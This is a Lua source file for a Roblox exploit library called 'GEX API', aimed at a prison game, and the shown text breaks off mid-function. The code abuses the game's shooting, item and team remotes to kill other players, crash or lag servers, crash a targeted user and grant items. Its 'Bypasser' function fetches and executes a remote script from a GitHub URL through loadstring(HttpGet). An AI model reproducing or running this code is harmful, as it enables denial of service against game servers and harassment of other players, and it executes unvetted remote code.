--[[
	Welcome to GEX API! This is an open source API which has a large variety of features.
	
	To use these features, you call one of these with this prefix; API:insertcommand()
	
	for instance, API:Speed(50)
	
	Current list of features:
	
	API:GetGun(GunName) 				(gives you a certain gun)
	API:AllGuns() 					(gives you every gun)
	API:Speed(speed) 				(changes your speed)
	API:JumpPower(power) 				(changes your jump power)
	API:Gravity(gravity) 				(changes your gravity)
	API:Time() 					(gets the current time)
	API:SaveGame() 					(downloads game if compatible)
	API:Bypasser() 					(executes bypasser script)
	API:Teleport(PlrName) 				(teleport to a player)
	API:bring(playerInstance,Cframe) 		(bring a player to either you, or a certain cframe position)
	API:ChangeTeam(Team) 				(change to a certain team)
	API:KillPlayer(Target) 				(high success rate)
	API:KillAll() [buggy] 				(kills every player besides criminals)
	API:MoveTo(cframe) 				(teleport somewhere)
	API:CrashServer() 				(weak server crash)
	API:Refresh() 					(refresh yourself)
	API:lag() 					(LAGS SERVER)
	API:Keycard()					(Gives keycard)
	(NEW FEATURES)
	API:Knife()					(Gives knife)
	API:Hammer()					(Gives hammer)
	API:Serverhop()					(Changes your server)
	API:Tase(Target) [ TEAM, ALL, PLAYERNAME ] 	(Tases the target, note to use NAME and not INSTANCE)

	experimental:

	API:MakeAllCrim() 				(manually teleports every prisoner to crim base)
	API:CrashUser(playerinstance) 			(HIGH FAIL RATE, if it fails it shuts down the server, use at own risk.)


	(EXPERIMENTAL) Toggleables

	To use toggleables, AKA Antiarrest, autotools, ect, you need to call the function:

	ChangeState()

	There are parameters, for instance, if it is a boolean, you can put either nil or "boolean" to change the state.

	Current features:

	ChangeState(nil,"AntiArrest")			(TURNS ON/OFF ANTIARREST)
	ChangeState(nil,"AutoItems")			(TURNS ON/OFF AUTOITEMS)
	ChangeState(nil,"killaura")			(TURNS ON/OFF KILLAURA)
]]

local API = {}
local Temp = {}
local Reload_Guns = {}

local Whitelist = game:GetService("HttpService"):JSONDecode((game:HttpGet("https://raw.githubusercontent.com/TheXbots/GEX_API/main/Whitelist.lua")))

if not Whitelist[game.Players.LocalPlayer.Name] then
	game.Players.LocalPlayer:Kick("You are not whitelisted.")
end

function API:Tween(Obj, Prop, New, Time)
	if not Time then
		Time = .5
	end
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(
		Time, 
		Enum.EasingStyle.Quart, 
		Enum.EasingDirection.Out, 
		0, 
		false,
		0
	)
	local propertyTable = {
		[Prop] = New,
	}

	TweenService:Create(Obj, info, propertyTable):Play()
end

function API:Notif(Text,Dur)
	task.spawn(function()
		if not Dur then
			Dur = 1.5
		end
		local Notif = Instance.new("ScreenGui")
		local Frame_1 = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		Notif.Parent = (game:GetService("CoreGui") or gethui())
		Notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		Frame_1.Parent = Notif
		Frame_1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame_1.BackgroundTransparency=1
		Frame_1.BorderSizePixel = 0
		Frame_1.Position = UDim2.new(0, 0, 0.0500000007, 0)
		Frame_1.Size = UDim2.new(1, 0, 0.100000001, 0)
		TextLabel.Parent = Frame_1
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.TextTransparency =1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.Highway
		TextLabel.Text = Text or "Text not found"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 21.000
		API:Tween(Frame_1,"BackgroundTransparency",0.350,.5)
		API:Tween(TextLabel,"TextTransparency",0,.5)
		wait(Dur+.7)
		API:Tween(Frame_1,"BackgroundTransparency",1,.5)
		API:Tween(TextLabel,"TextTransparency",1,.5)
		wait(.7)
		Notif:Destroy()
	end)
	return
end

local CurrentVersion = "0.0.8"
local Old_Version = game:GetService("HttpService"):JSONDecode((game:HttpGet("https://raw.githubusercontent.com/TheXbots/GEX_API/main/Version.lua"))).Version

if CurrentVersion ~= Old_Version then
    API:Notif("Outdated! Go to github/GexAPI/GEX_API/main for latest.")
end

local PremiumActivated = true

local plr = game.Players.LocalPlayer
local Player = game.Players.LocalPlayer

API.Whitelisted = {game.Players.LocalPlayer}
local Unloaded = false

local States = {}

States.loopkillinmates = false
States.loopkillcriminals = false
States.DraggableGuis = false
States.spawnguns = false
States.loopkillguards = false
States.Antishield = false
States.DoorsDestroy = false
States.antipunch = false
States.AutoRespawn = true
States.AutoItems = false
States.ClickKill = false
States.ClickArrest = false
States.AntiTase = false
States.AntiArrest = false
States.OnePunch = false
States.killaura = false
States.anticrash = false
States.AntiTouch = false
States.ShootBack = false
States.AntiFling = false
States.AutoInfAmmo = false
States.joinlogs = false
States.noclip = false
States.Godmode = false
States.loopopendoors = false
States.SilentAim = false
States.ArrestAura = false
States.OneShot = false
States.ff = false
States.esp = false
States.earrape = false
--
Temp.IsBringing = false
Temp.Loopkilling = {}
Temp.ArrestOldP = false
Temp.KillAuras = {}
Temp.Admins = {}
Temp.LoopmKilling = {}
Temp.Viruses = {}
Temp.SavedAdmins = {}
Temp.IsGettingKeycard = false
Running = false

function Clipboard(value)
    local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(value)
	else

	end
end

function API:FindPlayer(String,IgnoreError)
	String = String:gsub("%s+", "")
	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Name:lower():match("^" .. String:lower()) or v.DisplayName:lower():match("^" .. String:lower()) then
			return v
		end
	end
	if not IgnoreError then
		API:Notif("Player has left or is not in your current game.",false)
	end
	return nil
end

function API:Chat(text)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "ALL")
end

function API:GetCameraPosition(Player)
	return workspace["CurrentCamera"].CFrame
end

function API:Loop(Times, calling)
	for i = 1, tonumber(Times) do
		calling()
	end
end

function API:GetHumanoid()
	return plr.Character:FindFirstChildOfClass("Humanoid")
end

function API:CheckForPlayer(Target)
    local Players = game.Players:GetPlayers()
    for i,v in pairs(Players) do
        if v == Target then
            return true
        end
    end

    return false
end

function API:GuardsFull(a)
	if #game:GetService("Teams").Guards:GetPlayers()==8 then
		if a then
			if Player.Team == game.Teams.Guards then
				return false
			end
		end
		return false
	end
	return true
end

function API:UnSit()
	game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
end

function API:ConvertPosition(Position)
	if typeof(Position):lower() == "position" then
		return CFrame.new(Position)
	else
		return Position
	end
end

function API:CreateBulletTable(Amount, Hit, IsTrue)
	local Args = {}
	for i = 1, tonumber(Amount) do
		if IsTrue then
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(990.272583, 101.489975, 2362.74878), Vector3.new(-799.978333, 0.23157759, -5.88794518)),
				["Distance"] = 198.9905242919922,
				["Cframe"] = CFrame.new(894.362549, 101.288307, 2362.53491, -0.0123058055, 0.00259522465, -0.999920964, 3.63797837e-12, 0.999996722, 0.00259542116, 0.999924302, 3.19387436e-05, -0.0123057645),
			}
		else
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
				["Distance"] = 0,
				["Cframe"] = CFrame.new(),
				["Hit"] = Hit,
			}
		end
	end
	return Args
end

function API:MoveTo(Cframe)
	Cframe = API:ConvertPosition(Cframe)
	local Amount = 5
	if Player.PlayerGui['Home']['hud']['Topbar']['titleBar'].Title.Text:lower() == "lights out" or Player.PlayerGui.Home.hud.Topbar.titleBar.Title.Text:lower() == "lightsout" then
		Amount = 11
	end
	for i = 1, Amount do
		API:UnSit()
		Player.Character:WaitForChild("HumanoidRootPart").CFrame = Cframe
		API:swait()
	end
end

function API:swait()
	game:GetService("RunService").Stepped:Wait()
end

function API:GetPart(Target)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	return Target.Character:FindFirstChild("HumanoidRootPart") or Target.Character:FindFirstChild("Head")
end

function API:GetPosition(Player)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	if Player then
		return API:GetPart(Player).CFrame
	elseif not Player then
		return API:GetPart(plr).CFrame
	end
end

function API:GetGun(Item, Ignore)
    local Player = game.Players.LocalPlayer

    task.spawn(function()
        workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
            Position = Player.Character.Head.Position,
            Parent = workspace.Prison_ITEMS:FindFirstChild(Item, true)
        })
    end)
end

function API:AllGuns()
    local plr = game.Players.LocalPlayer 
    local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
    if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) then
        API:GetGun("M4A1", true)
    end

    API:GetGun("AK-47", true)

    task.spawn(function()
        API:GetGun("Remington 870", true)
    end)

    API:GetGun("M9", true)

    game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(saved)
end

function API:Gravity(value)
    workspace.Gravity = value
end

function API:Speed(value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
end

function API:JumpPower(value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
end

function API:SaveGame()
    local s,e = pcall(function()
        if saveinstance or saveinstance() then saveinstance() end
    end)

    if s then
        print("Saved!")
    else
        print("Your executor does not have this capability.")
    end
end

function API:Teleport(plr)
    local player = game.Players.Localplayer
    local Character = player.Character

    local s,e = pcall(function()
        Character:MoveTo(game.Workspace:FindFirstChild(plr).HumanoidRootPart.Position)
    end)
end

function API:Time()
    local HOUR = math.floor((tick() % 86400) / 3600)
    local MINUTE = math.floor((tick() % 3600) / 60)
    local SECOND = math.floor(tick() % 60)
    local AP = HOUR > 11 and 'PM' or 'AM'
    HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
    HOUR = HOUR < 10 and '0' .. HOUR or HOUR
    MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
    SECOND = SECOND < 10 and '0' .. SECOND or SECOND
    return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
end

function API:Bypasser()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
end

function API:bring(Target,TeleportTo,MoreTP,DontBreakCar)
	local BringingFromAdmin = nil
	if Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>0 and Target.Character:FindFirstChildOfClass("Humanoid").Sit == false then
		if not TeleportTo then
			TeleportTo = API:GetPosition()
		end
		local Orgin = API:GetPosition()
		local CarPad = workspace.Prison_ITEMS.buttons["Car Spawner"]
		local car = nil
		local Seat = nil
		local Failed = false
		local CheckForBreak = function()
			if not Target or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health<1 or Player.Character:FindFirstChildOfClass("Humanoid").Health<1 then
				Failed = true
				return true
			else
				return nil
			end
		end

		for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
			if v then
				if v:WaitForChild("Body"):WaitForChild("VehicleSeat").Occupant == nil then
					car = v
				end
			end
		end
		if not car then
			coroutine.wrap(function()
				if not car then
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end
			end)()
			repeat wait()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-524, 55, 1777))
				task.spawn(function()
					workspace.Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"])
				end)
				if CheckForBreak() then
					break
				end
			until car
		end
		car:WaitForChild("Body"):WaitForChild("VehicleSeat")
		car.PrimaryPart = car.Body.VehicleSeat
		Seat = car.Body.VehicleSeat
		repeat wait()
			Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
		until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
		wait() --// so it doesnt break
		repeat API:swait()
			if CheckForBreak() or not Player.Character:FindFirstChildOfClass("Humanoid") or Player.Character:FindFirstChildOfClass("Humanoid").Sit == false then
				break
			end
			car.PrimaryPart = car.Body.VehicleSeat
			if Target.Character:FindFirstChildOfClass("Humanoid").MoveDirection.Magnitude >0 then
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-6))
			else
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))
			end
		until Target.Character:FindFirstChildOfClass("Humanoid").Sit == true
		if Failed then
			API:Notif("Failed to bring the player!")
			if BringingFromAdmin then
				local ohString1 = "/w "..Target.Name.." ".."ADMIN: Bring has failed! Try again later."
				local ohString2 = "All"
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
			end
			return
		end
		for i =1,10 do
			car:SetPrimaryPartCFrame(TeleportTo)
			API:swait()
		end
		wait(.1)
		task.spawn(function()
			if PremiumActivated and not DontBreakCar then
				repeat task.wait() until Target.Character:FindFirstChildOfClass("Humanoid").Sit == false
				repeat wait()
					Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
				until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
				for i =1,10 do
					car:SetPrimaryPartCFrame(CFrame.new(0,workspace.FallenPartsDestroyHeight+10,0))
					API:swait()
				end
				API:UnSit()
				API:MoveTo(Orgin)
			end
		end)
		if not PremiumActivated then
			API:UnSit()
			API:MoveTo(Orgin)
		end
	else
		if BringingFromAdmin then
			local ohString1 = "/w "..Target.Name.." ".."ADMIN: Bring has failed! Try again later."
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

		end
		API:Notif("Player has died or is sitting or an unknown error.")
	end
end

function API:MakeAllCrim()
    for i,v in pairs(game.Players:GetPlayers()) do
        if v.Team.Name == "Inmates" then
            API:bring(v,CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
        end
    end
end

function API:WaitForRespawn(Cframe,NoForce)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	local Cframe = API:ConvertPosition(Cframe)
	local CameraCframe = API:GetCameraPosition()
	coroutine.wrap(function()
		local a
		a = Player.CharacterAdded:Connect(function(NewCharacter)
			pcall(function()
				coroutine.wrap(function()
					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					API:Loop(5, function()
						workspace["CurrentCamera"].CFrame = CameraCframe
					end)
				end)()
				NewCharacter:WaitForChild("HumanoidRootPart")
				API:MoveTo(Cframe)
				if NoForce then
					task.spawn(function()
						NewCharacter:WaitForChild("ForceField"):Destroy()
					end)
				end
			end)
			a:Disconnect()
			Cframe = nil
		end)
		task.spawn(function()
			wait(2)
			if a then
				a:Disconnect()
			end
		end)
	end)()
end

function API:ChangeTeam(TeamPath,NoForce,Pos)
	pcall(function()
		repeat task.wait() until game:GetService("Players").LocalPlayer.Character
		game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

		API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
	end)
	if TeamPath == game.Teams.Criminals then
		task.spawn(function()
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		end)
		repeat API:swait() until Player.Team == game.Teams.Inmates and Player.Character:FindFirstChild("HumanoidRootPart")
		repeat
			API:swait()
			if firetouchinterest then
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 0)
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 1)
			end
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].Transparency = 1
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CanCollide = false
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = API:GetPosition()
		until plr.Team == game:GetService("Teams").Criminals
		game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = CFrame.new(0, 3125, 0)
	else
		if TeamPath == game.Teams.Neutral then
			workspace['Remote']['TeamEvent']:FireServer("Bright orange")
		else
			if not TeamPath or not TeamPath.TeamColor then
				workspace['Remote']['TeamEvent']:FireServer("Bright orange")
			else
				workspace['Remote']['TeamEvent']:FireServer(TeamPath.TeamColor.Name)
			end
		end
	end
end

function API:Refresh(NoForce,Position)
	API:ChangeTeam(plr.Team,NoForce,Position)
end

function API:KillPlayer(Target,Failed,DoChange)
	local Bullets = API:CreateBulletTable(20,(Target.Character:FindFirstChild("Head") or Target.Character:FindFirstChildOfClass("Part")))
	if not Target or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
		return
	end
	repeat API:swait() until not Target.Character:FindFirstChildOfClass("ForceField")
	local CurrentTeam = nil
	if Target.Team == Player.Team then
		if Target.Team~= game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Criminals,true)
		elseif Target.Team == game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Inmates,true)
		end
	end

	local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
	API:GetGun("Remington 870")
	repeat API:swait()Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
	task.spawn(function()
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
	end)
	coroutine.wrap(function()
		wait(.7)
		pcall(function()
			if Target.Character:FindFirstChildOfClass("Humanoid").Health >1 and not Failed then
				API:KillPlayer(Target,true)
			end
		end)
	end)()
	if CurrentTeam and not Player.Team == CurrentTeam and not DoChange then
		wait(.3)
		API:ChangeTeam(CurrentTeam,true)
	end
end

function API:CrashServer()

    API:Chat("Crashing the server. (Brought to you by AntiExploit Hub)")

    local Gun = "Remington 870"

    local Player = game.Players.LocalPlayer.Name

    API:GetGun(Gun)

    for i,v in pairs(game.Players[Player].Backpack:GetChildren()) do
        if v.name == (Gun) then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end

    Gun = game.Players[Player].Character[Gun]

    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()

    function FireGun(target)
        coroutine.resume(coroutine.create(function()
        local bulletTable = {}
        table.insert(bulletTable, {
        Hit = target,
        Distance = 100,
        Cframe = CFrame.new(0,1,1),
        RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
        })
        game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
        wait()
        end))
    end

    while game:GetService("RunService").Stepped:wait() do
	for count = 0, 10, 10 do
	    FireGun()
	end
    end
end

function API:KillAll(TeamToKill)
	if not TeamToKill then
		local LastTeam = Player.Team
		local BulletTable = {}
		if Player.Team ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals,true)
		end
		API:GetGun("Remington 870")
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		repeat API:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun

		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~=Player  and v.Team == game.Teams.Inmates or v.Team == game.Teams.Guards and not table.find(API.Whitelisted,v)  then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		API:ChangeTeam(game.Teams.Inmates,true)
		API:GetGun("Remington 870")
		repeat API:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v and v~=Player and not table.find(API.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		if LastTeam ~= game.Teams.Inmates then
			API:ChangeTeam(LastTeam,true)
		end
	elseif TeamToKill then
		if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards  then
			if Player.Team ~= game.Teams.Criminals then
				API:ChangeTeam(game.Teams.Criminals)
			end
		elseif TeamToKill == game.Teams.Criminals then
			if Player.Team ~= game.Teams.Inmates then
				API:ChangeTeam(game.Teams.Inmates)
			end
		end
		local BulletTable = {}
		for i,v in pairs(TeamToKill:GetPlayers()) do
			if v and v~=Player and  not table.find(API.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		wait(.4)
		API:GetGun("M9")
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
		repeat task.wait() Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") until Gun

		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
	end
end

function API:lag()
	API:Notif("Lagging the server...")
	local Bullets = API:CreateBulletTable(10, nil, true)
	if API:GuardsFull() then
		API:GetGun("M9")
	else
		API:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	for i = 1,40 do
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
		if not Gun or not API:GetHumanoid() or API:GetHumanoid() and API:GetHumanoid().Health < 1  then
			task.wait(4)--//Ping cool down
			API:lag()
			break
		end
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end)()
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
		end)()
	end
end

function API:LoopKillAll()
    
end


function API:Toggle(name, value)
    local data = API.Toggleables[name]
    if data then
        API.Toggleables[name] = not API.Toggleables[name]
    else
        API.Toggleables[name] = false
    end
end

function API:Keycard()
    if Temp.IsGettingKeycard == false then
        Temp.IsGettingKeycard = true
        local Oldc = API:GetPosition()
        local OldT = Player.Team
        if plr.Character:FindFirstChild("Key card") or plr.Backpack:FindFirstChild("Key card") then
            API:Notif("You already have a keycard!",false)
            Temp.IsGettingKeycard = false
            return true
        end
        if #game.Teams.Guards:GetPlayers() == 8 and plr.Team ~= game.Teams.Guards then
            repeat 
                API:KillAll(game.Teams.Guards)
            until 
                game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card")

            if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
                local counter1 = 0
                if Player.Team ~= OldT then
                    API:ChangeTeam(OldT)
                    repeat 
                    task.wait()
                    counter1 += 1 
                    until Player.Team == OldT or counter1 >= 30
                end
                if counter1 >= 30 then
                    Temp.IsGettingKeycard = false
                    API:MoveTo(Oldc)
                    API:Notif("Failed to get keycard.", 3)
                    return true
                end
                wait()
                local counter = 0
                repeat wait(0.5)
                    local a =pcall(function()
                        local Key = workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP
                        game.Workspace.Remote["ItemHandler"]:InvokeServer(Key)
                        API:MoveTo(CFrame.new(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP.Position+Vector3.new(0,3,0)))
                        counter += 1
                    end)
                until plr.Backpack:FindFirstChild("Key card") or counter >= 100
    
            else
                Temp.IsGettingKeycard = false
                API:MoveTo(Oldc)
                API:Notif("Failed to get keycard.", 3)
                return true
            end
            Temp.IsGettingKeycard = false
            API:MoveTo(Oldc)
            return true
        end
        API:ChangeTeam(game.Teams.Guards)
        local counter2 = 0
        repeat wait(.5)
            Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
            wait()
            API:Refresh()
            counter2 += 1
        until game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") or counter2 >= 100
        if not game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
            Temp.IsGettingKeycard = false
            API:Notif("Failed to get keycard.", 3)
            API:MoveTo(Oldc)
            return true
        end
        if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
            local counter1 = 0
            if Player.Team ~= OldT then
                API:ChangeTeam(OldT)
                repeat 
                task.wait()
                counter1 += 1 
                until Player.Team == OldT or counter1 >= 30
            end
            if counter1 >= 30 then
                Temp.IsGettingKeycard = false
                API:MoveTo(Oldc)
                API:Notif("Failed to get keycard.", 3)
                return true
            end
            wait()
            local counter = 0
            repeat wait(0.5)
                local a =pcall(function()
                    local Key = workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP
                    game.Workspace.Remote["ItemHandler"]:InvokeServer(Key)
                    API:MoveTo(CFrame.new(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP.Position+Vector3.new(0,3,0)))
                    counter += 1
                end)
            until plr.Backpack:FindFirstChild("Key card") or counter >= 100

        else
            Temp.IsGettingKeycard = false
            API:MoveTo(Oldc)
            API:Notif("Failed to get keycard.", 3)
            return true
        end
        API:MoveTo(Oldc)

        if plr.Backpack:FindFirstChild("Key card") then
            Temp.IsGettingKeycard = false
            return true
        else
            API:Notif("Failed to get keycard.",3)
            Temp.IsGettingKeycard = false
            return true
        end
    else
        API:Notif("You are already getting keycard!",3)
    end
end

function API:CrashUser(Target)
    if not API:CheckForPlayer(Target) then
        API:Notif("Player not found.",3)
        return
    end
    API:Chat("Server will crash unless "..Target.Name.." leaves the server. (Brought to you by AntiExploit Hub)")

	local Bullets = API:CreateBulletTable(40, (Target.Character:FindFirstChild("Head") or Target.Character:FindFirstChildOfClass("Part")))
	
	if API:GuardsFull() then
		API:GetGun("M9")
	else
		API:ChangeTeam(game.Teams.Guards)
	end
	
	repeat
		task.wait()
		API:GetGun("M9")
		if not API:CheckForPlayer(Target) then
			return
		end
	until 
		Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") or not API:CheckForPlayer(Target)
	
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	
	local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	
	while game.Players:FindFirstChild(Target.Name) do
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
		task.wait(0.1)
	
		if not API:CheckForPlayer(Target) then
            API:Notif("Target has left the server. Initiating server restoration.")
            API:Chat("Player crashed/left.")
		    return
		end
	end
end

function API:Knife()
    workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
end

function API:Hammer()
    workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Hammer"]})
end

function API:Serverhop()
	local Ids = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if typeof(v) == "table" and v['maxPlayers'] > v['playing'] and v['id'] ~= game['JobId'] then
			table.insert(Ids,v.id)
		end
	end
	return game:GetService("TeleportService"):TeleportToPlaceInstance(game['PlaceId'], Ids[math.random(1, #Ids)])
end

function API:InfAmmo()
    if plr.Character:FindFirstChildOfClass("Tool") then
        local Tool = plr.Character:FindFirstChildOfClass("Tool")
        if not Tool:FindFirstChild("GunStates") then
            return API:Notif("Needs to be a gun!")
        end
        local cc = require(Tool.GunStates)
        cc["MaxAmmo"] = math.huge
        cc["StoredAmmo"] = math.huge
        cc["AmmoPerClip"] = math.huge
        cc["CurrentAmmo"] = math.huge
        table.insert(Reload_Guns, Tool)
        Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
    else
        API:Notif("You need to hold the tool you want to mod!",false)
    end
end

function API:Tase(target)
    if target == "all" then
        local Oldt = Player.Team
        API:ChangeTeam(game.Teams.Guards)
        repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
        wait(.7)
        local ohTable1 = {}
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v and v~= Player and v.Team ~= game.Teams.Guards then
                table.insert(ohTable1, {
                    ["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
                    ["Distance"] = -1,
                    ["Cframe"] = CFrame.new(),
                    ["Hit"] = v.Character.Head
                })
            end
        end
        local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
        game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
        task.spawn(function()
